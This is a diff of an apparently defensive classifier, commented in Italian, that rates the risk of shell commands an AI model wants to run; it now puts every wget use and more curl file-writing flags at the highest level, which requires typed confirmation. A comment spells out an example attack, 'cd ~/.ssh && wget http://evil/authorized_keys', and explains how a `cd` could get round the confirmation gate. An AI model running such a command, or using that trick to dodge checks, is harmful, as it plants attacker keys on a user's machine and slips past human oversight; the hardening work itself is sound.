@@ -705,27 +705,35 @@
     // Anche un comando LEVEL2 ridotto a `--version`/`--help` è sola lettura → 1.
     if (LEVEL2.has(prog)) {
       if (isVersionQuery(trimmed)) return 1;
-      // curl/wget che scrivono un file di output a un percorso arbitrario possono
+      // wget SCARICA SEMPRE SU FILE — è questa la differenza con curl, che senza
+      // `-o` stampa a schermo. Senza alcun flag di output `wget <url>` crea
+      // comunque un file nella cartella di lavoro, col nome deciso dall'URL
+      // (quindi dal server); e la cartella di lavoro la sceglie l'assistente da
+      // sé, perché `cd` è livello 1 (nessuna conferma) e la cwd è persistente tra
+      // i suoi comandi. Così `cd ~/.ssh && wget http://evil/authorized_keys` fa
+      // atterrare il file ESATTAMENTE dove lo faceva atterrare
+      // `wget -O ~/.ssh/authorized_keys`, che chiede di digitare "conferma".
+      // Stesso effetto → stesso livello, e NESSUNA eccezione: qualunque esenzione
+      // (perfino `--spider`, l'unica forma che non scarica) si deciderebbe
+      // leggendo il testo del comando, e chi lo compone può sempre far comparire
+      // la parola dove wget non la applica — dopo `--`, dentro le virgolette,
+      // dentro l'URL. Vedi il cappello del file.
+      if (prog === 'wget') return 3;
+      // curl che scrive un file di output a un percorso arbitrario può
       // sovrascrivere qualsiasi file (chiavi SSH, script d'avvio) → 3.
-      if ((prog === 'curl' || prog === 'wget') && CURL_WGET_OUTPUT_RE.test(trimmed)) return 3;
-      // wget -P/--directory-prefix: sceglie la dir, il nome file arriva dall'URL
-      // (server) → stessa scrittura arbitraria di -O → 3.
-      if (prog === 'wget' && WGET_PREFIX_RE.test(trimmed)) return 3;
+      if (prog === 'curl' && CURL_OUTPUT_RE.test(trimmed)) return 3;
       // curl -D/--dump-header: scrive gli header (contenuto del server) in un
       // percorso arbitrario → 3.
       if (prog === 'curl' && CURL_DUMP_RE.test(trimmed)) return 3;
-      // curl -c/--cookie-jar, --etag-save, --trace/--trace-ascii, --stderr:
-      // salvano dati accessori influenzati dal server in un percorso scelto → 3.
+      // curl -c/--cookie-jar, --etag-save, --trace/--trace-ascii, --stderr,
+      // --libcurl, --hsts, --alt-svc: salvano dati accessori influenzati dal
+      // server in un percorso scelto → 3.
       if (prog === 'curl' && CURL_ACCESSORY_WRITE_RE.test(trimmed)) return 3;
-      // wget --save-cookies: scrive i cookie del sito in un percorso scelto → 3.
-      if (prog === 'wget' && WGET_SAVE_COOKIES_RE.test(trimmed)) return 3;
+      // curl -w '%output{FILE}': il "formato di stampa" atterra su un file → 3.
+      if (prog === 'curl' && CURL_WRITE_OUT_FILE_RE.test(trimmed)) return 3;
       // curl -K/--config: le opzioni (output compreso) arrivano da un file, quindi
       // l'effetto non si legge nel comando → 3.
       if (prog === 'curl' && CURL_CONFIG_RE.test(trimmed)) return 3;
-      // wget fa SEMPRE atterrare un file su disco (nome dall'URL, cartella = cwd,
-      // che l'assistente sposta da sé con un `cd` senza conferma) → 3. Solo
-      // `--spider`, che si limita a controllare se l'URL esiste, resta 2.
-      if (prog === 'wget' && !WGET_NO_DOWNLOAD_RE.test(trimmed)) return 3;
       // robocopy /MIR /PURGE (cancellano la destinazione) / /MOVE /MOV
       // (cancellano la sorgente): distruzione permanente → 3.
       if (prog === 'robocopy' && ROBOCOPY_DESTRUCTIVE_RE.test(trimmed)) return 3;
